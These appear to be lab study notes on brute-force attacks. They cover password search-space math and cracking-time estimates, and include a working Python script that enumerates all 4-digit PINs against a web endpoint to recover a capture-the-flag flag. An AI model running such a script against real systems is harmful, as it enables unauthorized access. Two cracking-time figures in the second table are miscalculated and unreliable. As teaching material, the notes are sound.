# 🔓 Brute Force Attacks

Brute-force attacks systematically attempt all possible password combinations until the correct one is found. The feasibility of such attacks is governed by the **size of the search space**, which grows exponentially with password length and character variety.

---

## 📐 Password Search Space: The Math

To calculate the number of possible password combinations:

```
Possible Combinations = (Character Set Size) ^ (Password Length)
```

### 🧮 Examples:

| Description            | Length | Character Set                | Combinations                         |
|------------------------|--------|------------------------------|--------------------------------------|
| Short and Simple       | 6      | Lowercase (a–z)              | 26⁶ = 308,915,776                    |
| Longer but Simple      | 8      | Lowercase (a–z)              | 26⁸ = 208,827,064,576                |
| Added Case Sensitivity | 8      | a–z, A–Z                     | 52⁸ = 53,459,728,531,456             |
| Maximum Complexity     | 12     | a–z, A–Z, 0–9, symbols (~94) | 94¹² ≈ 4.76 × 10²³ (475 quintillion) |

> ✅ **Key Insight**: Each additional character **exponentially** increases cracking difficulty.

---

## 🖥️ Cracking Time: Basic vs Supercomputer

### Cracking Speeds (Examples):

- **Basic PC**: ~1 million guesses/second  
- **Supercomputer**: ~1 trillion guesses/second

| Password Type              | Combinations          | Basic PC Time     | Supercomputer Time |
|---------------------------|-----------------------|-------------------|---------------------|
| 6 lowercase               | ~309 million          | ~5 minutes        | <1 second           |
| 8 alphanumeric            | ~218 trillion         | ~6.92 years       | ~1.7 hours          |
| 12 full ASCII (94 chars) | ~4.76 × 10²³          | 15 million years  | ~15,000 years       |

> 💡 **Takeaway**: Even the most powerful hardware can't brute-force long, complex passwords efficiently.

---

## 🎯 Practical Brute Force Demo – Cracking a 4-digit PIN

The target system exposes an endpoint `/pin?pin=xxxx`. A correct 4-digit PIN returns a flag.

### 🔧 Python Script: `pin-solver.py`

```python
import requests

ip = "127.0.0.1"   # 🔁 Replace with target IP
port = 1234        # 🔁 Replace with target port

# Try all 10,000 possible 4-digit PINs (0000–9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    print(f"Attempted PIN: {formatted_pin}")

    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    if response.ok and 'flag' in response.json():
        print(f"✅ Correct PIN found: {formatted_pin}")
        print(f"🏁 Flag: {response.json()['flag']}")
        break
```

> 🔄 This script brute-forces all 4-digit PINs and identifies the correct one by checking the response for a `flag`.

### 🖥️ Sample Output:

```
Attempted PIN: 4052
✅ Correct PIN found: 4053
🏁 Flag: HTB{...}
```

---

## 🔐 Key Lessons

- **Short numeric PINs are trivial to brute-force**.
- Even **moderate password complexity** significantly boosts security.
- The **real-world feasibility** of brute-force attacks depends heavily on:
  - Password length and charset
  - Lockout mechanisms
  - Rate-limiting
  - Attacker's hardware resources

---
